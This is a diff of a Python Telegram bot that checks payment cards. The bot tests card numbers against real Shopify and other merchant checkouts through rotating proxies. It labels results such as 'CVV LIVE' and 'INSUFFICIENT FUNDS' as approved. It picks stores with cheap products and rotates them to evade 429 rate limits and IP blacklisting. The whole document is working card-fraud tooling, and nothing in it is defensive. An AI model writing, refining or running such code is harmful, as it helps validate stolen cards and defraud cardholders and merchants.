+                print(f"💰 [API] INSUFFICIENT FUNDS")
                 return {
-                    "status": "success",
-                    "result": response_text,
+                    "status": "success", "result": response_text,
                     "message": response_text,
                     "status_display": "💰 INSUFFICIENT FUNDS",
                     "status_category": "approved",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Check for CVV LIVE - FIXED: Removed the extra closing quote
+
+            # -------- CVV live ----------
             if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
-                print(f"✅ [API] CVV LIVE detected!")
+                print(f"✅ [API] CVV LIVE")
                 return {
-                    "status": "success",
-                    "result": response_text,
+                    "status": "success", "result": response_text,
                     "message": response_text,
                     "status_display": "✅ CVV LIVE",
                     "status_category": "approved",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Check for retryable errors
-            retryable_patterns = [
+
+            # -------- Retryable patterns ----------
+            retryable = [
                 "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
-                "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
+                "DECISION_RULE_BLOCK", "No products under $3 found!",
+                "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422",
-                "Unable to get payment token",
-                "Unable to get payment token: 403",
-                "payment token: 403",
-                "PAYMENT TOKEN: 403",
-                "UNKNOWN",
-                "GATEWAY UNKNOWN",
-                "UNKNOWN GATEWAY",
-                "Gateway Unknown",
-                "gateway unknown", 
-                
-                "AMOUNT_TOO_SMALL",
-                "AMOUNT_TOO_SMALL", 
-                "403",
-                "payment token failed",
-                "SERVER DISCONNECTED",
-                "Invalid JSON",
-                "Invalid JSON response",
-                "Expecting value",
-                "JSON parse error",
-                "JSON_ERROR", 
-                "token generation failed",
-                "Failed to get payment token",
-                "GET PAYMENT TOKEN FAILED",
-                "PAYMENT_TOKEN_FAILED",
-                "TOKEN_GENERATION_FAILED","CART FAILED WITH STATUS 429",
-                "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
-                "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+                "Unable to get payment token", "payment token: 403",
+                "PAYMENT TOKEN: 403", "UNKNOWN", "GATEWAY UNKNOWN",
+                "UNKNOWN GATEWAY", "Gateway Unknown", "gateway unknown",
+                "AMOUNT_TOO_SMALL", "403", "payment token failed",
+                "SERVER DISCONNECTED", "Invalid JSON", "Invalid JSON response",
+                "Expecting value", "JSON parse error", "JSON_ERROR",
+                "token generation failed", "Failed to get payment token",
+                "GET PAYMENT TOKEN FAILED", "PAYMENT_TOKEN_FAILED",
+                "TOKEN_GENERATION_FAILED", "CART FAILED WITH STATUS 429",
+                "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402",
+                "SITE ERROR! STATUS: 403",
+                "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
+                "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                 "PAYMENTS_FLEXIBILITY_TERMS_ID_MISMATCH",
-                "PAYMENTS_TERMS_ID_MISMATCH",
-                "TERMS_ID_MISMATCH",
-                "FLEXIBILITY_TERMS",
-                "PAYMENT_FLEXIBILITY",
-                "CART_FAILED",
-                "Cart failed",
-                "CART_FAILED_WITH_STATUS",
+                "PAYMENTS_TERMS_ID_MISMATCH", "TERMS_ID_MISMATCH",
+                "FLEXIBILITY_TERMS", "PAYMENT_FLEXIBILITY",
+                "CART_FAILED", "Cart failed", "CART_FAILED_WITH_STATUS",
                 "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
                 "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
                 "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
-                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","payment token: 403","Unable to get payment token", 
+                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                 "INVALID_PAYMENT_METHOD", "Site not supported",
                 "NO VARIANTS", "Not Shopify!", "No Valid Products",
-                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Unable to get payment token",
-                "payment token: 403",
-                "403",
-                "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
-                "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
-                "PAYMENT_METHOD_NOT_ACCEPTED",
-                "SITE ERROR! STATUS: 429", "Cart failed with status",
-                "HTTP Error: 404", "HTTP Error: 403", "HTTP Error: 401", "404",
+                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR",
+                "TIMEOUT", "SUBMIT REJECTED", "TOKENIZE_FAIL",
+                "INVALID JSON RESPONSE", "EMPTY_RESPONSE",
+                "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
+                "PAYMENT_METHOD_NOT_ACCEPTED", "SITE ERROR! STATUS: 429",
+                "Cart failed with status", "HTTP Error: 404",
+                "HTTP Error: 403", "HTTP Error: 401", "404",
                 "SITE ERROR! STATUS: 404", "Cart failed with status 403",
-                "PROXY_AUTH_FAILED", "Throttled", "Throttled",
+                "PROXY_AUTH_FAILED", "Throttled",
                 "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED",
                 "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
-                "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401", "HTTP 407",
-                "407", "PROXY AUTHENTICATION REQUIRED", "407 PROXY AUTHENTICATION REQUIRED",
+                "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED",
+                "HTTP 401", "HTTP 407", "407",
+                "PROXY AUTHENTICATION REQUIRED",
+                "407 PROXY AUTHENTICATION REQUIRED",
             ]
-            
-            is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
-            
-            if is_retryable:
-                print(f"🔄 [API] Retryable error: {response_text[:100]}")
+            if any(p in response_upper for p in retryable):
+                print(f"🔄 [API] Retryable: {response_text[:100]}")
                 return {
-                    "status": "error",
-                    "result": response_text,
+                    "status": "error", "result": response_text,
                     "message": response_text,
                     "status_display": "⚠️ RETRYABLE",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Unknown response - treat as DECLINED
-            print(f"❌ [API] Unknown response - treating as DECLINED")
+
+            # -------- Fallback: unknown → declined ----------
+            print(f"❌ [API] Unknown — treating as DECLINED")
             return {
-                "status": "declined",
-                "result": response_text,
+                "status": "declined", "result": response_text,
                 "message": response_text,
                 "status_display": "❌ DECLINED",
                 "status_category": "declined",
-                "elapsed": elapsed,
-                "price": str(price),
-                "gateway": gateway,
-                "site": site_clean,
-                "proxy_used": proxy,
-                "api_name": api.get('name', 'Unknown')
+                "elapsed": elapsed, "price": str(price),
+                "gateway": gateway, "site": site_clean,
+                "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
             }
-                
+
         except httpx.TimeoutException:
-            print(f"⏰ Request timeout for site {site_clean}")
+            print(f"⏰ Timeout for {site_clean}")
             return {
-                "status": "error",
-                "result": "TIMEOUT",
+                "status": "error", "result": "TIMEOUT",
                 "message": "Request timeout",
                 "status_display": "⚠️ TIMEOUT",
                 "status_category": "retryable",
-                "elapsed": elapsed,
-                "price": price,
-                "gateway": gateway,
-                "site": site_clean,
-                "proxy_used": proxy,
+                "elapsed": elapsed, "price": price, "gateway": gateway,
+                "site": site_clean, "proxy_used": proxy,
                 "api_name": api.get('name', 'Unknown')
             }
         except Exception as e:
-            print(f"❌ API request error: {e}")
+            print(f"❌ API error: {e}")
             return {
-                "status": "error",
-                "result": "REQUEST_ERROR",
+                "status": "error", "result": "REQUEST_ERROR",
                 "message": str(e)[:100],
                 "status_display": "⚠️ REQUEST ERROR",
                 "status_category": "retryable",
-                "elapsed": elapsed,
-                "price": price,
-                "gateway": gateway,
-                "site": site_clean,
-                "proxy_used": proxy,
+                "elapsed": elapsed, "price": price, "gateway": gateway,
+                "site": site_clean, "proxy_used": proxy,
                 "api_name": api.get('name', 'Unknown')
             }
-    
+
+    # ---------------------------------------------------------------
+    #  STATS
+    # ---------------------------------------------------------------
     def get_site_performance_stats(self) -> str:
         if not self.site_performance:
             return "📊 No site performance data available."
-        
-        result = "📊 <b>Site Performance Statistics</b>\n\n"
-        
+
+        result = "📊 <b>Site Performance</b>\n\n"
         sorted_sites = sorted(
             self.site_performance.items(),
             key=lambda x: (x[1].get('good_responses', 0), -x[1].get('rate_limits', 0)),
             reverse=True
         )
-        
         for site, stats in sorted_sites[:20]:
             good = stats.get('good_responses', 0)
-            rate_limits = stats.get('rate_limits', 0)
+            rl = stats.get('rate_limits', 0)
             total = stats.get('total_checks', 0)
             is_good = stats.get('is_good', False)
-            
-            status = "🌟 GOOD" if is_good else "📌 NORMAL"
-            result += f"{status} <code>{site}</code>\n"
-            result += f"   ├─ Good Responses: {good}\n"
-            result += f"   ├─ Rate Limits (429): {rate_limits}\n"
-            result += f"   ├─ Total Checks: {total}\n"
-            result += f"   └─ Last Response: {stats.get('last_response', 'N/A')[:50]}\n\n"
-        
-        if len(sorted_sites) > 20:
-            result += f"... and {len(sorted_sites) - 20} more sites\n"
-        
+            cd = " ⏸️COOLDOWN" if self.is_site_on_cooldown(site) else ""
+            result += f"{'🌟' if is_good else '📌'} <code>{site}</code>{cd}\n"
+            result += f"   ├─ Good: {good}\n"
+            result += f"   ├─ 429s: {rl}\n"
+            result += f"   └─ Total: {total}\n\n"
         return result
-    
+
     def get_stats(self) -> str:
-        result = "📊 <b>Shopify API Pool Statistics</b>\n\n"
-        
+        result = "📊 <b>Shopify API Pool Stats</b>\n\n"
         for api in self.apis:
             name = api["name"]
             stats = self.api_stats.get(name, {})
-            enabled = "✅"
             total = stats.get('total_requests', 0)
-            successful = stats.get('successful', 0)
-            retryable = stats.get('retryable', 0)
-            rate_limited = stats.get('rate_limited', 0)
-            failed = stats.get('failed', 0)
-            success_rate = (successful / max(total, 1)) * 100
-            
-            result += f"{enabled} <b>{name}</b>\n"
+            ok = stats.get('successful', 0)
+            rt = stats.get('retryable', 0)
+            rl = stats.get('rate_limited', 0)
+            fl = stats.get('failed', 0)
+            rate = (ok / max(total, 1)) * 100
+            result += f"✅ <b>{name}</b>\n"
             result += f"   ├─ Requests: {total}\n"
-            result += f"   ├─ Success Rate: {success_rate:.1f}%\n"
-            result += f"   ├─ Successful: {successful}\n"
-            result += f"   ├─ Retryable Errors: {retryable}\n"
-            result += f"   ├─ Rate Limited (429): {rate_limited}\n"
-            result += f"   ├─ Failed: {failed}\n"
+            result += f"   ├─ Success Rate: {rate:.1f}%\n"
+            result += f"   ├─ Successful: {ok}\n"
+            result += f"   ├─ Retryable: {rt}\n"
+            result += f"   ├─ Rate Limited: {rl}\n"
+            result += f"   ├─ Failed: {fl}\n"
             result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
             result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
-        
+
         result += "\n" + site_rotation_manager.get_stats()
         result += "\n\n" + self.get_site_performance_stats()
-        
         return result
-    
+
     async def close(self):
         if self.session:
             await self.session.aclose()
             self.session = None
 
+
 # Create global instance
 shopify_api_pool = ShopifyAPIPool()
+
 
 
 
@@ -28577,9 +28396,10 @@ async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_T
 
 class SiteRotationManager:
     """
-    Manages site rotation with pattern: 3 GOOD sites → 2 NORMAL sites → repeat
+    Site rotation: 3 GOOD → 2 NORMAL → repeat.
+    Automatically skips sites that are on 429 cooldown.
     """
-    
+
     def __init__(self):
         self.good_sites_index = 0
         self.normal_sites_index = 0
@@ -28587,336 +28407,264 @@ class SiteRotationManager:
         self.normal_sites_cache = []
         self.cache_time = 0
         self.cache_ttl = 30
-        
-        # Rotation pattern: 3 GOOD, then 2 NORMAL, then repeat
+
+        # rotation pattern
         self.pattern = ['good', 'good', 'good', 'normal', 'normal']
         self.pattern_index = 0
-        
-        # 429 cooldown tracking
-        self.rate_limited_sites = {}  # site -> {'count': 0, 'cooldown_until': 0}
-        self.RATE_LIMIT_THRESHOLD = 3  # 3 consecutive 429 errors
-        self.RATE_LIMIT_COOLDOWN = 30  # 30 seconds cooldown
-        
+
+        # local 429 tracking
+        self.rate_limited_sites = {}   # site -> {'count': 0, 'cooldown_until': 0}
+        self.RATE_LIMIT_THRESHOLD = 3
+        self.RATE_LIMIT_COOLDOWN = 30
+
         self.last_used_type = "good"
-        
-        print("🔄 Site Rotation Manager initialized")
+
+        print("🔄 Site Rotation Manager initialised")
         print("📊 Pattern: 3 GOOD → 2 NORMAL → repeat")
-        print("⏸️ 429 cooldown: 3 errors → 30s cooldown")
-    
+        print("⏸️ 429 cooldown: 30s (shared with ShopifyAPIPool)")
+
+    # ---------------------------------------------------------------
     def _get_good_sites(self) -> List[str]:
-        """Get GOOD sites (under $5)"""
         now = time.time()
-        
         if self.good_sites_cache and (now - self.cache_time) < self.cache_ttl:
             return self.good_sites_cache
-        
+
         good_sites = site_quality_tracker.get_good_sites_sorted_by_price()
-        
-        # Also check site_quality_tracker.good_sites
         for site in list(site_quality_tracker.good_sites):
             if site not in good_sites:
                 price = site_quality_tracker.get_site_price(site)
                 if price < 5:
                     good_sites.append(site)
-        
-        # Remove duplicates and sort by price
+
         good_sites = list(set(good_sites))
         good_sites.sort(key=lambda s: site_quality_tracker.get_site_price(s))
-        
+
         self.good_sites_cache = good_sites
         self.cache_time = now
-        
         if self.good_sites_cache:
-            print(f"🌟 [Good Sites] Found {len(self.good_sites_cache)} GOOD sites (under $5)")
-        
+            print(f"🌟 [Good Sites] {len(self.good_sites_cache)} GOOD sites (under $5)")
         return self.good_sites_cache
-    
+
     def _get_normal_sites(self) -> List[str]:
-        """Get NORMAL sites ($5-$10)"""
         now = time.time()
-        
         if self.normal_sites_cache and (now - self.cache_time) < self.cache_ttl:
             return self.normal_sites_cache
-        
+
         normal_sites = site_quality_tracker.get_normal_sites()
-        
-        # Also check site_quality_tracker.normal_sites
         for site in list(site_quality_tracker.normal_sites):
             if site not in normal_sites:
                 price = site_quality_tracker.get_site_price(site)
                 if 5 <= price < 10:
                     normal_sites.append(site)
-        
-        # Remove duplicates and sort by price
+
         normal_sites = list(set(normal_sites))
         normal_sites.sort(key=lambda s: site_quality_tracker.get_site_price(s))
-        
         self.normal_sites_cache = normal_sites
-        
         if self.normal_sites_cache:
-            print(f"📌 [Normal Sites] Found {len(self.normal_sites_cache)} NORMAL sites ($5-$10)")
-        
+            print(f"📌 [Normal Sites] {len(self.normal_sites_cache)} NORMAL sites ($5-$10)")
         return self.normal_sites_cache
-    
+
+    # ---------------------------------------------------------------
     def _is_site_on_cooldown(self, site: str) -> bool:
-        """Check if a site is on 429 cooldown"""
+        """Check both local and pool cooldowns."""
+        # Pool-level cooldown
+        if hasattr(shopify_api_pool, 'is_site_on_cooldown'):
+            if shopify_api_pool.is_site_on_cooldown(site):
+                return True
+        # Local cooldown
         if site in self.rate_limited_sites:
-            cooldown_until = self.rate_limited_sites[site].get('cooldown_until', 0)
-            if time.time() < cooldown_until:
-                remaining = int(cooldown_until - time.time())
-                print(f"⏸️ [Cooldown] {site} on cooldown for {remaining}s")
+            cd = self.rate_limited_sites[site].get('cooldown_until', 0)
+            if time.time() < cd:
+                remaining = int(cd - time.time())
+                print(f"⏸️ [Cooldown] {site} — {remaining}s remaining")
                 return True
             else:
-                # Cooldown expired - reset count
                 self.rate_limited_sites[site]['count'] = 0
         return False
-    
+
+    # ---------------------------------------------------------------
     def _get_next_good_site(self) -> Optional[str]:
-        """Get next GOOD site (skip cooldown sites)"""
         good_sites = self._get_good_sites()
-        
         if not good_sites:
             return None
-        
-        # Try to find a non-cooldown site
         for _ in range(len(good_sites) * 2):
             if self.good_sites_index >= len(good_sites):
                 self.good_sites_index = 0
-            
             site = good_sites[self.good_sites_index]
             self.good_sites_index += 1
-            
-            # Also check if site exists in rotation
             if site not in autosopi_site_manager.sites:
                 continue
-            
             if not self._is_site_on_cooldown(site):
                 return site
-        
-        # All GOOD sites on cooldown - return None
         return None
-    
+
     def _get_next_normal_site(self) -> Optional[str]:
-        """Get next NORMAL site (skip cooldown sites)"""
         normal_sites = self._get_normal_sites()
-        
         if not normal_sites:
             return None
-        
         for _ in range(len(normal_sites) * 2):
             if self.normal_sites_index >= len(normal_sites):
                 self.normal_sites_index = 0
-            
             site = normal_sites[self.normal_sites_index]
             self.normal_sites_index += 1
-            
             if site not in autosopi_site_manager.sites:
                 continue
-            
             if not self._is_site_on_cooldown(site):
                 return site
-        
         return None
-    
+
+    # ---------------------------------------------------------------
     def get_next_site(self) -> Optional[str]:
-        """
-        Get next site following pattern: 3 GOOD → 2 NORMAL → repeat
-        """
-        # Refresh caches
+        """Get next site (3 GOOD → 2 NORMAL pattern), skipping 429 cooldowns."""
         good_sites = self._get_good_sites()
         normal_sites = self._get_normal_sites()
-        
-        # If no GOOD sites, use NORMAL
+
+        # Filter out cooldown sites
+        good_sites = [s for s in good_sites if not self._is_site_on_cooldown(s)]
+        normal_sites = [s for s in normal_sites if not self._is_site_on_cooldown(s)]
+
         if not good_sites:
-            print("⚠️ No GOOD sites available, using NORMAL sites")
+            print("⚠️ No GOOD sites available (all on cooldown?) — using NORMAL")
             site = self._get_next_normal_site()
             if site:
-                print(f"📌 [Fallback] Using NORMAL site: {site}")
+                print(f"📌 [Fallback] NORMAL: {site}")
                 return site
-            # If no sites at all, try autosopi_site_manager
             return autosopi_site_manager.get_next_site_weighted()
-        
-        # If no NORMAL sites, use GOOD only
+
         if not normal_sites:
-            print("⚠️ No NORMAL sites available, using GOOD only")
+            print("⚠️ No NORMAL sites available — using GOOD only")
             site = self._get_next_good_site()
             if site:
-                print(f"🌟 [GOOD Only] Using GOOD site: {site}")
+                print(f"🌟 [GOOD Only] {site}")
                 return site
             return autosopi_site_manager.get_next_site_weighted()
-        
-        # Follow the pattern: 3 GOOD, 2 NORMAL, repeat
+
         max_attempts = len(self.pattern) * 3
         attempts = 0
-        
         while attempts < max_attempts:
             attempts += 1
-            
             current_type = self.pattern[self.pattern_index % len(self.pattern)]
-            
+
             if current_type == 'good':
                 site = self._get_next_good_site()
                 if site:
                     self.pattern_index += 1
                     price = site_quality_tracker.get_site_price(site)
-                    print(f"🌟 [GOOD #{self.good_sites_index}/{len(good_sites)}] {site} (${price:.2f})")
+                    print(f"🌟 [GOOD] {site} (${price:.2f})")
                     return site
-                else:
-                    # No GOOD site available, try NORMAL
-                    print(f"⚠️ No GOOD sites available, trying NORMAL...")
-                    site = self._get_next_normal_site()
-                    if site:
-                        self.pattern_index += 1
-                        price = site_quality_tracker.get_site_price(site)
-                        print(f"📌 [NORMAL Fallback] {site} (${price:.2f})")
-                        return site
-                    else:
-                        # No sites at all
-                        return None
-            
-            else:  # normal
                 site = self._get_next_normal_site()
                 if site:
                     self.pattern_index += 1
                     price = site_quality_tracker.get_site_price(site)
-                    print(f"📌 [NORMAL #{self.normal_sites_index}/{len(normal_sites)}] {site} (${price:.2f})")
+                    print(f"📌 [NORMAL Fallback] {site} (${price:.2f})")
                     return site
-                else:
-                    # No NORMAL site available, try GOOD
-                    print(f"⚠️ No NORMAL sites available, trying GOOD...")
-                    site = self._get_next_good_site()
-                    if site:
-                        self.pattern_index += 1
-                        price = site_quality_tracker.get_site_price(site)
-                        print(f"🌟 [GOOD Fallback] {site} (${price:.2f})")
-                        return site
-                    else:
-                        return None
-        
-        # Fallback to any available site
+                return None
+            else:
+                site = self._get_next_normal_site()
+                if site:
+                    self.pattern_index += 1
+                    price = site_quality_tracker.get_site_price(site)
+                    print(f"📌 [NORMAL] {site} (${price:.2f})")
+                    return site
+                site = self._get_next_good_site()
+                if site:
+                    self.pattern_index += 1
+                    price = site_quality_tracker.get_site_price(site)
+                    print(f"🌟 [GOOD Fallback] {site} (${price:.2f})")
+                    return site
+                return None
+
         return autosopi_site_manager.get_next_site_weighted()
-    
+
+    # ---------------------------------------------------------------
     def record_rate_limit(self, site: str):
-        """
-        Record a 429 rate limit error for a site.
-        After 3 consecutive 429 errors, add 30 second cooldown.
-        """
         if site not in self.rate_limited_sites:
             self.rate_limited_sites[site] = {'count': 0, 'cooldown_until': 0}
-        
         self.rate_limited_sites[site]['count'] += 1
         count = self.rate_limited_sites[site]['count']
-        
-        print(f"🚫 [429] {site} rate limit #{count}/{self.RATE_LIMIT_THRESHOLD}")
-        
+        print(f"🚫 [429] {site} — #{count}/{self.RATE_LIMIT_THRESHOLD}")
         if count >= self.RATE_LIMIT_THRESHOLD:
-            # Add cooldown
-            cooldown_until = time.time() + self.RATE_LIMIT_COOLDOWN
-            self.rate_limited_sites[site]['cooldown_until'] = cooldown_until
+            cd = time.time() + self.RATE_LIMIT_COOLDOWN
+            self.rate_limited_sites[site]['cooldown_until'] = cd
             self.rate_limited_sites[site]['count'] = 0
-            print(f"⏸️ [Cooldown] {site} added to cooldown for {self.RATE_LIMIT_COOLDOWN}s")
-    
+            print(f"⏸️ [Cooldown] {site} on cooldown for {self.RATE_LIMIT_COOLDOWN}s")
+
     def record_site_result(self, site: str, success: bool, response_text: str = ""):
-        """
-        Record site result - reset 429 count on success
-        """
         if success:
-            # Reset rate limit count on success
             if site in self.rate_limited_sites:
                 self.rate_limited_sites[site]['count'] = 0
                 self.rate_limited_sites[site]['cooldown_until'] = 0
-        
-        # Check for 429 in response
         if "429" in response_text or "Rate limit" in response_text:
             self.record_rate_limit(site)
-    
+
+    # ---------------------------------------------------------------
     def get_stats(self) -> str:
-        """Get rotation statistics"""
         good_sites = self._get_good_sites()
         normal_sites = self._get_normal_sites()
-        
         msg = "🔄 <b>Site Rotation Status</b>\n\n"
-        msg += f"🌟 GOOD sites (under $5): {len(good_sites)}\n"
-        msg += f"📌 NORMAL sites ($5-$10): {len(normal_sites)}\n"
-        msg += f"📊 Pattern: 3 GOOD → 2 NORMAL → repeat\n"
-        msg += f"📌 Current pattern index: {self.pattern_index}/{len(self.pattern)}\n"
-        msg += f"🌟 GOOD index: {self.good_sites_index}/{len(good_sites)}\n"
-        msg += f"📌 NORMAL index: {self.normal_sites_index}/{len(normal_sites)}\n\n"
-        
-        # Show sites on cooldown
-        cooldown_sites = []
+        msg += f"🌟 GOOD (under $5): {len(good_sites)}\n"
+        msg += f"📌 NORMAL ($5-$10): {len(normal_sites)}\n"
+        msg += f"📊 Pattern: 3 GOOD → 2 NORMAL\n"
+        msg += f"⏸️ 429 cooldown: {self.RATE_LIMIT_COOLDOWN}s\n\n"
+
+        cooldowns = []
         for site, data in self.rate_limited_sites.items():
             if time.time() < data.get('cooldown_until', 0):
                 remaining = int(data['cooldown_until'] - time.time())
-                cooldown_sites.append((site, remaining))
-        
-        if cooldown_sites:
-            msg += f"⏸️ <b>Sites on 429 Cooldown:</b>\n"
-            for site, remaining in cooldown_sites:
-                msg += f"   • {site} ({remaining}s remaining)\n"
+                cooldowns.append((site, remaining))
+
+        # include pool cooldowns
+        if hasattr(shopify_api_pool, 'site_cooldown'):
+            for site, until in shopify_api_pool.site_cooldown.items():
+                if time.time() < until:
+                    remaining = int(until - time.time())
+                    if site not in [s for s, _ in cooldowns]:
+                        cooldowns.append((site, remaining))
+
+        if cooldowns:
+            msg += "⏸️ <b>Sites on 429 Cooldown:</b>\n"
+            for site, rem in cooldowns:
+                msg += f"   • {site} ({rem}s)\n"
         else:
-            msg += f"✅ No sites on cooldown\n"
-        
-        # Show next sites
-        if good_sites:
-            msg += f"\n🌟 <b>Next GOOD sites:</b>\n"
-            for i in range(min(3, len(good_sites))):
-                idx = (self.good_sites_index + i) % len(good_sites)
-                site = good_sites[idx]
-                price = site_quality_tracker.get_site_price(site)
-                msg += f"  {i+1}. {site} (${price:.2f})\n"
-        
-        if normal_sites:
-            msg += f"\n📌 <b>Next NORMAL sites:</b>\n"
-            for i in range(min(3, len(normal_sites))):
-                idx = (self.normal_sites_index + i) % len(normal_sites)
-                site = normal_sites[idx]
-                price = site_quality_tracker.get_site_price(site)
-                msg += f"  {i+1}. {site} (${price:.2f})\n"
-        
+            msg += "✅ No sites on cooldown\n"
         return msg
-    
+
     def reset_rotation(self):
-        """Reset all rotation indices"""
         self.good_sites_index = 0
         self.normal_sites_index = 0
         self.pattern_index = 0
         self.cache_time = 0
         print("🔄 Site rotation reset")
-    
+
     def get_current_position(self) -> dict:
-        """Get current rotation position"""
         good_sites = self._get_good_sites()
-        
         return {
             'good_index': self.good_sites_index,
             'good_total': len(good_sites),
             'next_good': good_sites[self.good_sites_index % len(good_sites)] if good_sites else None,
             'mode': 'GOOD_SITES_ONLY'
         }
-    
+
     def force_refresh_good_sites(self):
-        """Force refresh the GOOD sites list"""
         self.cache_time = 0
         self._get_good_sites()
-        print("🔄 GOOD sites list refreshed")
-    
+        print("🔄 GOOD sites refreshed")
+
     def add_site_to_good(self, site: str, price: float):
-        """Manually add a site to GOOD list"""
         if price > 0 and price < 5:
             site_quality_tracker.good_sites.add(site)
             site_quality_tracker.price_cache[site] = price
             site_quality_tracker.save_stats()
             self.cache_time = 0
-            print(f"🌟 Manually added GOOD site: {site} (${price:.2f})")
+            print(f"🌟 Manually added GOOD: {site} (${price:.2f})")
             return True
-        else:
-            print(f"⚠️ Cannot add {site} - price ${price:.2f} is not under $5")
-            return False
+        return False
 
 
 # Create global instance
 site_rotation_manager = SiteRotationManager()
+
+
 
 
 
@@ -70380,7 +70128,6 @@ def back_menu():
 
 
 # --- HANDLER FOR REPLY MESSAGES ---
-# --- HANDLER FOR REPLY MESSAGES ---
 async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Handle when user replies to a message (file OR text with cards) with a check command.
@@ -70768,13 +70515,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         card = cards[0]
         print(f"📦 [REPLY] Single card → gateway={gateway}")
 
-        if gateway == 'shopify':
-            asyncio.create_task(single_check_shopify_pool(update, context, card))
-
-        elif gateway == 'autosopi':
-            asyncio.create_task(autosopi_single_check_logic(update, context, card))
-
-        elif gateway == 'strip5':
+        if gateway == 'strip5':
             context.args = [card]
             asyncio.create_task(strip5_single(update, context))
 
@@ -70864,12 +70605,6 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         elif gateway == 'ezycourse':
             context.args = [card]
             asyncio.create_task(single_check_ezycourse(update, context))
-
-        else:
-            await update.message.reply_text(
-                f"❌ Single check not implemented for <code>{gateway}</code>.",
-                parse_mode=ParseMode.HTML
-            )
 
         return True
 
